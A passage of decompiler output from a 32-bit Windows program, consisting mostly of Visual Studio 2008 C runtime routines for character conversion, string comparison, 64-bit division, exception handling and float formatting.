  bool bVar7;
  undefined4 *local_20;
  _cpinfo local_1c;
  uint local_8;
  
  local_8 = DAT_00422040 ^ (uint)&stack0xfffffffc;
  cbMultiByte = *param_4;
  bVar1 = false;
  if (param_1 == param_2) goto LAB_00416b16;
  BVar2 = GetCPInfo(param_1,&local_1c);
  if ((((BVar2 == 0) || (local_1c.MaxCharSize != 1)) ||
      (BVar2 = GetCPInfo(param_2,&local_1c), BVar2 == 0)) || (local_1c.MaxCharSize != 1)) {
    uVar6 = MultiByteToWideChar(param_1,1,param_3,cbMultiByte,(LPWSTR)0x0,0);
    bVar7 = uVar6 == 0;
    if (bVar7) goto LAB_00416b16;
  }
  else {
    bVar1 = true;
    uVar6 = cbMultiByte;
    if (cbMultiByte == 0xffffffff) {
      sVar3 = _strlen(param_3);
      uVar6 = sVar3 + 1;
    }
    bVar7 = uVar6 == 0;
  }
  if ((bVar7 || (int)uVar6 < 0) || (0x7ffffff0 < uVar6)) {
    local_20 = (undefined4 *)0x0;
  }
  else {
    _Size = uVar6 * 2 + 8;
    if (_Size < 0x401) {
      puVar4 = (undefined4 *)&stack0xffffffbc;
      local_20 = (undefined4 *)&stack0xffffffbc;
      if (&stack0x00000000 != (undefined *)0x44) {
LAB_00416a56:
        local_20 = puVar4 + 2;
      }
    }
    else {
      puVar4 = (undefined4 *)_malloc(_Size);
      local_20 = puVar4;
      if (puVar4 != (undefined4 *)0x0) {
        *puVar4 = 0xdddd;
        goto LAB_00416a56;
      }
    }
  }
  if (local_20 != (undefined4 *)0x0) {
    _memset(local_20,0,uVar6 * 2);
    iVar5 = MultiByteToWideChar(param_1,1,param_3,cbMultiByte,(LPWSTR)local_20,uVar6);
    if (iVar5 != 0) {
      if (param_5 == (LPSTR)0x0) {
        if (((bVar1) ||
            (uVar6 = WideCharToMultiByte(param_2,0,(LPCWSTR)local_20,uVar6,(LPSTR)0x0,0,(LPCSTR)0x0,
                                         (LPBOOL)0x0), uVar6 != 0)) &&
           (lpMultiByteStr = (LPSTR)__calloc_crt(1,uVar6), lpMultiByteStr != (LPSTR)0x0)) {
          uVar6 = WideCharToMultiByte(param_2,0,(LPCWSTR)local_20,uVar6,lpMultiByteStr,uVar6,
                                      (LPCSTR)0x0,(LPBOOL)0x0);
          if (uVar6 == 0) {
            _free(lpMultiByteStr);
          }
          else if (cbMultiByte != 0xffffffff) {
            *param_4 = uVar6;
          }
        }
      }
      else {
        WideCharToMultiByte(param_2,0,(LPCWSTR)local_20,uVar6,param_5,param_6,(LPCSTR)0x0,
                            (LPBOOL)0x0);
      }
    }
    __freea(local_20);
  }
LAB_00416b16:
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// WARNING: This is an inlined function
// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// Library Function - Single Match
//  __alloca_probe_16
// 
// Library: Visual Studio 2008 Release

uint __alloca_probe_16(undefined1 param_1)

{
  uint in_EAX;
  uint uVar1;
  
  uVar1 = 4 - in_EAX & 0xf;
  return in_EAX + uVar1 | -(uint)CARRY4(in_EAX,uVar1);
}



// WARNING: This is an inlined function
// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// Library Function - Single Match
//  __alloca_probe_8
// 
// Library: Visual Studio

uint __alloca_probe_8(undefined1 param_1)

{
  uint in_EAX;
  uint uVar1;
  
  uVar1 = 4 - in_EAX & 7;
  return in_EAX + uVar1 | -(uint)CARRY4(in_EAX,uVar1);
}



// Library Function - Single Match
//  _atol
// 
// Library: Visual Studio 2008 Release

long __cdecl _atol(char *_Str)

{
  long lVar1;
  
  lVar1 = _strtol(_Str,(char **)0x0,10);
  return lVar1;
}



// Library Function - Single Match
//  __strnicmp_l
// 
// Library: Visual Studio 2008 Release

int __cdecl __strnicmp_l(char *_Str1,char *_Str2,size_t _MaxCount,_locale_t _Locale)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  localeinfo_struct local_14;
  int local_c;
  char local_8;
  
  if (_MaxCount == 0) {
    iVar2 = 0;
  }
  else {
    _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,_Locale);
    if ((_Str1 == (char *)0x0) || (_Str2 == (char *)0x0)) {
      piVar1 = __errno();
      *piVar1 = 0x16;
      __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      if (local_8 != '\0') {
        *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
      }
      iVar2 = 0x7fffffff;
    }
    else if (_MaxCount < 0x80000000) {
      if ((local_14.locinfo)->lc_category[0].wlocale == (wchar_t *)0x0) {
        iVar2 = ___ascii_strnicmp(_Str1,_Str2,_MaxCount);
      }
      else {
        do {
          iVar2 = __tolower_l((uint)(byte)*_Str1,&local_14);
          _Str1 = _Str1 + 1;
          iVar3 = __tolower_l((uint)(byte)*_Str2,&local_14);
          _Str2 = (char *)((byte *)_Str2 + 1);
          _MaxCount = _MaxCount - 1;
          if ((_MaxCount == 0) || (iVar2 == 0)) break;
        } while (iVar2 == iVar3);
        iVar2 = iVar2 - iVar3;
      }
      if (local_8 != '\0') {
        *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
      }
    }
    else {
      piVar1 = __errno();
      *piVar1 = 0x16;
      __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      if (local_8 != '\0') {
        *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
      }
      iVar2 = 0x7fffffff;
    }
  }
  return iVar2;
}



// Library Function - Single Match
//  __strnicmp
// 
// Library: Visual Studio 2008 Release

int __cdecl __strnicmp(char *_Str1,char *_Str2,size_t _MaxCount)

{
  int *piVar1;
  int iVar2;
  
  if (DAT_00423c80 == 0) {
    if (((_Str1 != (char *)0x0) && (_Str2 != (char *)0x0)) && (_MaxCount < 0x80000000)) {
      iVar2 = ___ascii_strnicmp(_Str1,_Str2,_MaxCount);
      return iVar2;
    }
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    iVar2 = 0x7fffffff;
  }
  else {
    iVar2 = __strnicmp_l(_Str1,_Str2,_MaxCount,(_locale_t)0x0);
  }
  return iVar2;
}



// Library Function - Single Match
//  __isctype_l
// 
// Library: Visual Studio 2008 Release

int __cdecl __isctype_l(int _C,int _Type,_locale_t _Locale)

{
  int iVar1;
  BOOL BVar2;
  CHAR CVar3;
  localeinfo_struct local_1c;
  int local_14;
  char local_10;
  CHAR local_c;
  CHAR local_b;
  undefined local_a;
  ushort local_8 [2];
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_1c,_Locale);
  if (_C + 1U < 0x101) {
    local_8[0] = *(ushort *)(local_1c.locinfo[1].lc_category[0].locale + _C * 2);
  }
  else {
    iVar1 = __isleadbyte_l(_C >> 8 & 0xff,&local_1c);
    CVar3 = (CHAR)_C;
    if (iVar1 == 0) {
      local_b = '\0';
      iVar1 = 1;
      local_c = CVar3;
    }
    else {
      _C._0_1_ = (CHAR)((uint)_C >> 8);
      local_c = (CHAR)_C;
      local_a = 0;
      iVar1 = 2;
      local_b = CVar3;
    }
    BVar2 = ___crtGetStringTypeA
                      (&local_1c,1,&local_c,iVar1,local_8,(local_1c.locinfo)->lc_codepage,
                       (BOOL)(local_1c.locinfo)->lc_category[0].wlocale);
    if (BVar2 == 0) {
      if (local_10 != '\0') {
        *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
      }
      return 0;
    }
  }
  if (local_10 != '\0') {
    *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
  }
  return (uint)local_8[0] & _Type;
}



// Library Function - Single Match
//  __tolower_l
// 
// Library: Visual Studio 2008 Release

int __cdecl __tolower_l(int _C,_locale_t _Locale)

{
  int iVar1;
  uint uVar2;
  int iVar3;
  int *piVar4;
  CHAR CVar5;
  localeinfo_struct local_1c;
  int local_14;
  char local_10;
  byte local_c;
  undefined local_b;
  CHAR local_8;
  CHAR local_7;
  undefined local_6;
  
  iVar1 = _C;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_1c,_Locale);
  if ((uint)_C < 0x100) {
    if ((int)(local_1c.locinfo)->locale_name[3] < 2) {
      uVar2 = *(ushort *)(local_1c.locinfo[1].lc_category[0].locale + _C * 2) & 1;
    }
    else {
      uVar2 = __isctype_l(_C,1,&local_1c);
    }
    if (uVar2 == 0) {
LAB_00416ddb:
      if (local_10 == '\0') {
        return iVar1;
      }
      *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
      return iVar1;
    }
    uVar2 = (uint)*(byte *)((int)local_1c.locinfo[1].lc_category[0].wlocale + _C);
  }
  else {
    CVar5 = (CHAR)_C;
    if (((int)(local_1c.locinfo)->locale_name[3] < 2) ||
       (iVar3 = __isleadbyte_l(_C >> 8 & 0xff,&local_1c), iVar3 == 0)) {
      piVar4 = __errno();
      *piVar4 = 0x2a;
      local_7 = '\0';
      iVar3 = 1;
      local_8 = CVar5;
    }
    else {
      _C._0_1_ = (CHAR)((uint)_C >> 8);
      local_8 = (CHAR)_C;
      local_6 = 0;
      iVar3 = 2;
      local_7 = CVar5;
    }
    iVar3 = ___crtLCMapStringA(&local_1c,(local_1c.locinfo)->lc_category[0].wlocale,0x100,&local_8,
                               iVar3,(LPSTR)&local_c,3,(local_1c.locinfo)->lc_codepage,1);
    if (iVar3 == 0) goto LAB_00416ddb;
    uVar2 = (uint)local_c;
    if (iVar3 != 1) {
      uVar2 = (uint)CONCAT11(local_c,local_b);
    }
  }
  if (local_10 != '\0') {
    *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
  }
  return uVar2;
}



// Library Function - Single Match
//  _tolower
// 
// Library: Visual Studio 2008 Release

int __cdecl _tolower(int _C)

{
  if (DAT_00423c80 == 0) {
    if (_C - 0x41U < 0x1a) {
      return _C + 0x20;
    }
  }
  else {
    _C = __tolower_l(_C,(_locale_t)0x0);
  }
  return _C;
}



// Library Function - Single Match
//  ___ascii_strnicmp
// 
// Library: Visual Studio 2008 Release

int __cdecl ___ascii_strnicmp(char *_Str1,char *_Str2,size_t _MaxCount)

{
  char cVar1;
  byte bVar2;
  ushort uVar3;
  uint uVar4;
  bool bVar5;
  
  if (_MaxCount != 0) {
    do {
      bVar2 = *_Str1;
      cVar1 = *_Str2;
      uVar3 = CONCAT11(bVar2,cVar1);
      if (bVar2 == 0) break;
      uVar3 = CONCAT11(bVar2,cVar1);
      uVar4 = (uint)uVar3;
      if (cVar1 == '\0') break;
      _Str1 = (char *)((byte *)_Str1 + 1);
      _Str2 = _Str2 + 1;
      if ((0x40 < bVar2) && (bVar2 < 0x5b)) {
        uVar4 = (uint)CONCAT11(bVar2 + 0x20,cVar1);
      }
      uVar3 = (ushort)uVar4;
      bVar2 = (byte)uVar4;
      if ((0x40 < bVar2) && (bVar2 < 0x5b)) {
        uVar3 = (ushort)CONCAT31((int3)(uVar4 >> 8),bVar2 + 0x20);
      }
      bVar2 = (byte)(uVar3 >> 8);
      bVar5 = bVar2 < (byte)uVar3;
      if (bVar2 != (byte)uVar3) goto LAB_00416f11;
      _MaxCount = _MaxCount - 1;
    } while (_MaxCount != 0);
    _MaxCount = 0;
    bVar2 = (byte)(uVar3 >> 8);
    bVar5 = bVar2 < (byte)uVar3;
    if (bVar2 != (byte)uVar3) {
LAB_00416f11:
      _MaxCount = 0xffffffff;
      if (!bVar5) {
        _MaxCount = 1;
      }
    }
  }
  return _MaxCount;
}



void GetAdaptersAddresses(void)

{
                    // WARNING: Could not recover jumptable at 0x00416ffe. Too many branches
                    // WARNING: Treating indirect jump as call
  GetAdaptersAddresses();
  return;
}



void RtlUnwind(PVOID TargetFrame,PVOID TargetIp,PEXCEPTION_RECORD ExceptionRecord,PVOID ReturnValue)

{
                    // WARNING: Could not recover jumptable at 0x00417004. Too many branches
                    // WARNING: Treating indirect jump as call
  RtlUnwind(TargetFrame,TargetIp,ExceptionRecord,ReturnValue);
  return;
}



void FUN_0041700a(void)

{
  return;
}



// Library Function - Single Match
//  __cfltcvt_init
// 
// Library: Visual Studio 2008 Release

void __cfltcvt_init(void)

{
  PTR_LAB_00422de0 = __cfltcvt;
  PTR_LAB_00422de4 = __cropzeros;
  PTR_LAB_00422de8 = __fassign;
  PTR_LAB_00422dec = __forcdecpt;
  PTR_LAB_00422df0 = __positive;
  PTR_LAB_00422df4 = __cfltcvt;
  PTR_LAB_00422df8 = __cfltcvt_l;
  PTR_LAB_00422dfc = __fassign_l;
  PTR_LAB_00422e00 = __cropzeros_l;
  PTR_LAB_00422e04 = __forcdecpt_l;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __fpmath
// 
// Library: Visual Studio 2008 Release

void __cdecl __fpmath(int param_1)

{
  __cfltcvt_init();
  _DAT_00424fc8 = __ms_p5_mp_test_fdiv();
  if (param_1 != 0) {
    __setdefaultprecision();
  }
  return;
}



ulonglong __fastcall FUN_00417090(undefined4 param_1,undefined4 param_2)

{
  ulonglong uVar1;
  uint uVar2;
  float fVar3;
  float10 in_ST0;
  uint local_20;
  float fStack_1c;
  
  if (DAT_00424fd4 == 0) {
    uVar1 = (ulonglong)ROUND(in_ST0);
    local_20 = (uint)uVar1;
    fStack_1c = (float)(uVar1 >> 0x20);
    fVar3 = (float)in_ST0;
    if ((local_20 != 0) || (fVar3 = fStack_1c, (uVar1 & 0x7fffffff00000000) != 0)) {
      if ((int)fVar3 < 0) {
        uVar1 = uVar1 + (0x80000000 < ((uint)(float)(in_ST0 - (float10)uVar1) ^ 0x80000000));
      }
      else {
        uVar2 = (uint)(0x80000000 < (uint)(float)(in_ST0 - (float10)uVar1));
        uVar1 = CONCAT44((int)fStack_1c - (uint)(local_20 < uVar2),local_20 - uVar2);
      }
    }
    return uVar1;
  }
  return CONCAT44(param_2,(int)in_ST0);
}



// Library Function - Single Match
//  __alldiv
// 
// Library: Visual Studio

undefined8 __alldiv(uint param_1,uint param_2,uint param_3,uint param_4)

{
  ulonglong uVar1;
  longlong lVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  bool bVar10;
  char cVar11;
  uint uVar9;
  
  cVar11 = (int)param_2 < 0;
  if ((bool)cVar11) {
    bVar10 = param_1 != 0;
    param_1 = -param_1;
    param_2 = -(uint)bVar10 - param_2;
  }
  if ((int)param_4 < 0) {
    cVar11 = cVar11 + '\x01';
    bVar10 = param_3 != 0;
    param_3 = -param_3;
    param_4 = -(uint)bVar10 - param_4;
  }
  uVar3 = param_1;
  uVar5 = param_3;
  uVar6 = param_2;
  uVar9 = param_4;
  if (param_4 == 0) {
    uVar3 = param_2 / param_3;
    iVar4 = (int)(((ulonglong)param_2 % (ulonglong)param_3 << 0x20 | (ulonglong)param_1) /
                 (ulonglong)param_3);
  }
  else {
    do {
      uVar8 = uVar9 >> 1;
      uVar5 = uVar5 >> 1 | (uint)((uVar9 & 1) != 0) << 0x1f;
      uVar7 = uVar6 >> 1;
      uVar3 = uVar3 >> 1 | (uint)((uVar6 & 1) != 0) << 0x1f;
      uVar6 = uVar7;
      uVar9 = uVar8;
    } while (uVar8 != 0);
    uVar1 = CONCAT44(uVar7,uVar3) / (ulonglong)uVar5;
    iVar4 = (int)uVar1;
    lVar2 = (ulonglong)param_3 * (uVar1 & 0xffffffff);
    uVar3 = (uint)((ulonglong)lVar2 >> 0x20);
    uVar5 = uVar3 + iVar4 * param_4;
    if (((CARRY4(uVar3,iVar4 * param_4)) || (param_2 < uVar5)) ||
       ((param_2 <= uVar5 && (param_1 < (uint)lVar2)))) {
      iVar4 = iVar4 + -1;
    }
    uVar3 = 0;
  }
  if (cVar11 == '\x01') {
    bVar10 = iVar4 != 0;
    iVar4 = -iVar4;
    uVar3 = -(uint)bVar10 - uVar3;
  }
  return CONCAT44(uVar3,iVar4);
}



// Library Function - Single Match
//  void __stdcall _JumpToContinuation(void *,struct EHRegistrationNode *)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void _JumpToContinuation(void *param_1,EHRegistrationNode *param_2)

{
                    // WARNING: Load size is inaccurate
  ExceptionList = *ExceptionList;
                    // WARNING: Could not recover jumptable at 0x00417215. Too many branches
                    // WARNING: Treating indirect jump as call
  (*(code *)param_1)();
  return;
}



// Library Function - Multiple Matches With Different Base Names
//  void __stdcall _CallMemberFunction1(void *,void *,void *)
//  void __stdcall _CallMemberFunction2(void *,void *,void *,int)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void FID_conflict__CallMemberFunction1(undefined4 param_1,undefined *UNRECOVERED_JUMPTABLE)

{
  LOCK();
  UNLOCK();
                    // WARNING: Could not recover jumptable at 0x00417221. Too many branches
                    // WARNING: Treating indirect jump as call
  (*(code *)UNRECOVERED_JUMPTABLE)();
  return;
}



// Library Function - Single Match
//  void __stdcall _UnwindNestedFrames(struct EHRegistrationNode *,struct EHExceptionRecord *)
// 
// Library: Visual Studio 2008 Release

void _UnwindNestedFrames(EHRegistrationNode *param_1,EHExceptionRecord *param_2)

{
  void *pvVar1;
  
  pvVar1 = ExceptionList;
  RtlUnwind(param_1,(PVOID)0x41724e,(PEXCEPTION_RECORD)param_2,(PVOID)0x0);
  *(uint *)(param_2 + 4) = *(uint *)(param_2 + 4) & 0xfffffffd;
  *(void **)pvVar1 = ExceptionList;
  ExceptionList = pvVar1;
  return;
}



// Library Function - Multiple Matches With Different Base Names
//  ___CxxFrameHandler
//  ___CxxFrameHandler2
//  ___CxxFrameHandler3
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

undefined4 __cdecl
FID_conflict____CxxFrameHandler3
          (int *param_1,EHRegistrationNode *param_2,_CONTEXT *param_3,void *param_4)

{
  uint *in_EAX;
  undefined4 uVar1;
  
  uVar1 = ___InternalCxxFrameHandler
                    (param_1,param_2,param_3,param_4,in_EAX,0,(EHRegistrationNode *)0x0,'\0');
  return uVar1;
}



// Library Function - Single Match
//  enum _EXCEPTION_DISPOSITION __cdecl CatchGuardHandler(struct EHExceptionRecord *,struct
// CatchGuardRN *,void *,void *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

_EXCEPTION_DISPOSITION __cdecl
CatchGuardHandler(EHExceptionRecord *param_1,CatchGuardRN *param_2,void *param_3,void *param_4)

{
  _EXCEPTION_DISPOSITION _Var1;
  
  ___security_check_cookie_4(*(uint *)(param_2 + 8) ^ (uint)param_2);
  _Var1 = ___InternalCxxFrameHandler
                    ((int *)param_1,*(EHRegistrationNode **)(param_2 + 0x10),(_CONTEXT *)param_3,
                     (void *)0x0,*(uint **)(param_2 + 0xc),*(int *)(param_2 + 0x14),
                     (EHRegistrationNode *)param_2,'\0');
  return _Var1;
}



// Library Function - Single Match
//  int __cdecl _CallSETranslator(struct EHExceptionRecord *,struct EHRegistrationNode *,void *,void
// *,struct _s_FuncInfo const *,int,struct EHRegistrationNode *)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

int __cdecl
_CallSETranslator(EHExceptionRecord *param_1,EHRegistrationNode *param_2,void *param_3,void *param_4
                 ,_s_FuncInfo *param_5,int param_6,EHRegistrationNode *param_7)

{
  _ptiddata p_Var1;
  int local_3c;
  EHExceptionRecord *local_38;
  void *local_34;
  code *local_30;
  undefined4 *local_2c;
  code *local_28;
  uint local_24;
  _s_FuncInfo *local_20;
  EHRegistrationNode *local_1c;
  int local_18;
  EHRegistrationNode *local_14;
  undefined *local_10;
  undefined *local_c;
  int local_8;
  
  local_c = &stack0xfffffffc;
  local_10 = &stack0xffffffc0;
  if (param_1 == (EHExceptionRecord *)0x123) {
    *(undefined4 *)param_2 = 0x41738b;
    local_3c = 1;
  }
  else {
    local_28 = TranslatorGuardHandler;
    local_24 = DAT_00422040 ^ (uint)&local_2c;
    local_20 = param_5;
    local_1c = param_2;
    local_18 = param_6;
    local_14 = param_7;
    local_8 = 0;
    local_2c = (undefined4 *)ExceptionList;
    ExceptionList = &local_2c;
    local_38 = param_1;
    local_34 = param_3;
    p_Var1 = __getptd();
    local_30 = (code *)p_Var1->_translator;
    (*local_30)(*(undefined4 *)param_1,&local_38);
    local_3c = 0;
    if (local_8 != 0) {
                    // WARNING: Load size is inaccurate
      *local_2c = *ExceptionList;
    }
    ExceptionList = local_2c;
  }
  return local_3c;
}



// Library Function - Single Match
//  enum _EXCEPTION_DISPOSITION __cdecl TranslatorGuardHandler(struct EHExceptionRecord *,struct
// TranslatorGuardRN *,void *,void *)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

_EXCEPTION_DISPOSITION __cdecl
TranslatorGuardHandler
          (EHExceptionRecord *param_1,TranslatorGuardRN *param_2,void *param_3,void *param_4)

{
  _EXCEPTION_DISPOSITION _Var1;
  code *local_8;
  
  ___security_check_cookie_4(*(uint *)(param_2 + 8) ^ (uint)param_2);
  if ((*(uint *)(param_1 + 4) & 0x66) != 0) {
    *(undefined4 *)(param_2 + 0x24) = 1;
    return 1;
  }
  ___InternalCxxFrameHandler
            ((int *)param_1,*(EHRegistrationNode **)(param_2 + 0x10),(_CONTEXT *)param_3,(void *)0x0
             ,*(uint **)(param_2 + 0xc),*(int *)(param_2 + 0x14),
             *(EHRegistrationNode **)(param_2 + 0x18),'\x01');
  if (*(int *)(param_2 + 0x24) == 0) {
    _UnwindNestedFrames((EHRegistrationNode *)param_2,param_1);
  }
  _CallSETranslator((EHExceptionRecord *)0x123,(EHRegistrationNode *)&local_8,(void *)0x0,
                    (void *)0x0,(_s_FuncInfo *)0x0,0,(EHRegistrationNode *)0x0);
                    // WARNING: Could not recover jumptable at 0x0041744e. Too many branches
                    // WARNING: Treating indirect jump as call
  _Var1 = (*local_8)();
  return _Var1;
}



// Library Function - Single Match
//  struct _s_TryBlockMapEntry const * __cdecl _GetRangeOfTrysToCheck(struct _s_FuncInfo const
// *,int,int,unsigned int *,unsigned int *)
// 
// Library: Visual Studio 2008 Release

_s_TryBlockMapEntry * __cdecl
_GetRangeOfTrysToCheck(_s_FuncInfo *param_1,int param_2,int param_3,uint *param_4,uint *param_5)

{
  int iVar1;
  uint uVar2;
  int iVar3;
  uint uVar4;
  uint uVar5;
  uint uVar6;
  
  iVar1 = *(int *)(param_1 + 0x10);
  uVar6 = *(uint *)(param_1 + 0xc);
  uVar2 = uVar6;
  uVar4 = uVar6;
  while (uVar5 = uVar2, -1 < param_2) {
    if (uVar6 == 0xffffffff) {
      _inconsistency();
    }
    uVar6 = uVar6 - 1;
    iVar3 = uVar6 * 0x14 + iVar1;
    if (((*(int *)(iVar3 + 4) < param_3) && (param_3 <= *(int *)(iVar3 + 8))) ||
       (uVar2 = uVar5, uVar6 == 0xffffffff)) {
      param_2 = param_2 + -1;
      uVar2 = uVar6;
      uVar4 = uVar5;
    }
  }
  uVar6 = uVar6 + 1;
  *param_4 = uVar6;
  *param_5 = uVar4;
  if ((*(uint *)(param_1 + 0xc) < uVar4) || (uVar4 < uVar6)) {
    _inconsistency();
  }
  return (_s_TryBlockMapEntry *)(uVar6 * 0x14 + iVar1);
}



// Library Function - Single Match
//  __CreateFrameInfo
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

undefined4 * __cdecl __CreateFrameInfo(undefined4 *param_1,undefined4 param_2)

{
  _ptiddata p_Var1;
  
  *param_1 = param_2;
  p_Var1 = __getptd();
  param_1[1] = p_Var1->_pFrameInfoChain;
  p_Var1 = __getptd();
  p_Var1->_pFrameInfoChain = param_1;
  return param_1;
}



// Library Function - Single Match
//  __IsExceptionObjectToBeDestroyed
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

undefined4 __cdecl __IsExceptionObjectToBeDestroyed(int param_1)

{
  _ptiddata p_Var1;
  int *piVar2;
  
  p_Var1 = __getptd();
  piVar2 = (int *)p_Var1->_pFrameInfoChain;
  while( true ) {
    if (piVar2 == (int *)0x0) {
      return 1;
    }
    if (*piVar2 == param_1) break;
    piVar2 = (int *)piVar2[1];
  }
  return 0;
}



// Library Function - Single Match
//  __FindAndUnlinkFrame
// 
// Library: Visual Studio 2008 Release

void __cdecl __FindAndUnlinkFrame(void *param_1)

{
  void *pvVar1;
  _ptiddata p_Var2;
  void *pvVar3;
  
  p_Var2 = __getptd();
  if (param_1 == p_Var2->_pFrameInfoChain) {
    p_Var2 = __getptd();
    p_Var2->_pFrameInfoChain = *(void **)((int)param_1 + 4);
  }
  else {
    p_Var2 = __getptd();
    pvVar1 = p_Var2->_pFrameInfoChain;
    do {
      pvVar3 = pvVar1;
      if (*(int *)((int)pvVar3 + 4) == 0) {
        _inconsistency();
        return;
      }
      pvVar1 = *(void **)((int)pvVar3 + 4);
    } while (param_1 != *(void **)((int)pvVar3 + 4));
    *(undefined4 *)((int)pvVar3 + 4) = *(undefined4 *)((int)param_1 + 4);
  }
  return;
}



// Library Function - Single Match
//  void * __cdecl _CallCatchBlock2(struct EHRegistrationNode *,struct _s_FuncInfo const *,void
// *,int,unsigned long)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void * __cdecl
_CallCatchBlock2(EHRegistrationNode *param_1,_s_FuncInfo *param_2,void *param_3,int param_4,
                ulong param_5)

{
  void *pvVar1;
  void *local_1c;
  code *local_18;
  uint local_14;
  _s_FuncInfo *local_10;
  EHRegistrationNode *local_c;
  int local_8;
  
  local_14 = DAT_00422040 ^ (uint)&local_1c;
  local_10 = param_2;
  local_8 = param_4 + 1;
  local_18 = CatchGuardHandler;
  local_c = param_1;
  local_1c = ExceptionList;
  ExceptionList = &local_1c;
  pvVar1 = (void *)__CallSettingFrame_12(param_3,param_1,param_5);
  ExceptionList = local_1c;
  return pvVar1;
}



// Library Function - Single Match
//  __forcdecpt_l
// 
// Library: Visual Studio 2008 Release

void __cdecl __forcdecpt_l(char *_Buf,_locale_t _Locale)

{
  byte bVar1;
  byte bVar2;
  int iVar3;
  bool bVar4;
  int local_14 [2];
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,_Locale);
  iVar3 = _tolower((int)*_Buf);
  bVar4 = iVar3 == 0x65;
  while (!bVar4) {
    _Buf = (char *)((byte *)_Buf + 1);
    iVar3 = _isdigit((uint)(byte)*_Buf);
    bVar4 = iVar3 == 0;
  }
  iVar3 = _tolower((int)*_Buf);
  if (iVar3 == 0x78) {
    _Buf = (char *)((byte *)_Buf + 2);
  }
  bVar2 = *_Buf;
  *_Buf = ***(byte ***)(local_14[0] + 0xbc);
  do {
    _Buf = (char *)((byte *)_Buf + 1);
    bVar1 = *_Buf;
    *_Buf = bVar2;
    bVar2 = bVar1;
  } while (*_Buf != 0);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return;
}



// Library Function - Single Match
//  __cropzeros_l
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl __cropzeros_l(char *_Buf,_locale_t _Locale)

{
  char *pcVar1;
  char cVar3;
  int local_14 [2];
  int local_c;
  char local_8;
  char *pcVar2;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,_Locale);
  cVar3 = *_Buf;
  if (cVar3 != '\0') {
    do {
      if (cVar3 == ***(char ***)(local_14[0] + 0xbc)) break;
      _Buf = _Buf + 1;
      cVar3 = *_Buf;
    } while (cVar3 != '\0');
  }
  if (*_Buf != '\0') {
    do {
      _Buf = _Buf + 1;
      cVar3 = *_Buf;
      pcVar1 = _Buf;
      if ((cVar3 == '\0') || (cVar3 == 'e')) break;
    } while (cVar3 != 'E');
    do {
      pcVar2 = pcVar1;
      pcVar1 = pcVar2 + -1;
    } while (*pcVar1 == '0');
    if (*pcVar1 == ***(char ***)(local_14[0] + 0xbc)) {
      pcVar1 = pcVar2 + -2;
    }
    do {
      cVar3 = *_Buf;
      pcVar1 = pcVar1 + 1;
      _Buf = _Buf + 1;
      *pcVar1 = cVar3;
    } while (cVar3 != '\0');
  }
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return;
}



// Library Function - Single Match
//  __positive
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __cdecl __positive(double *arg)

{
  if (0.0 < *arg != (*arg == 0.0)) {
    return 1;
  }
  return 0;
}



// Library Function - Single Match
//  __fassign_l
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl __fassign_l(int flag,char *argument,char *number,_locale_t param_4)

{
  _CRT_FLOAT local_c;
  undefined4 local_8;
  
  if (flag == 0) {
    FID_conflict___atoflt_l((_CRT_FLOAT *)&flag,number,param_4);
    *(int *)argument = flag;
  }
  else {
    FID_conflict___atoflt_l(&local_c,number,param_4);
    *(float *)argument = local_c.f;
    *(undefined4 *)(argument + 4) = local_8;
  }
  return;
}



// Library Function - Single Match
//  __fassign
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl __fassign(int flag,char *argument,char *number)

{
  __fassign_l(flag,argument,number,(_locale_t)0x0);
  return;
}



// Library Function - Single Match
//  __shift
// 
// Library: Visual Studio 2008 Release

void __shift(void)

{
  char *in_EAX;
  size_t sVar1;
  int unaff_EDI;
  
  if (unaff_EDI != 0) {
    sVar1 = _strlen(in_EAX);
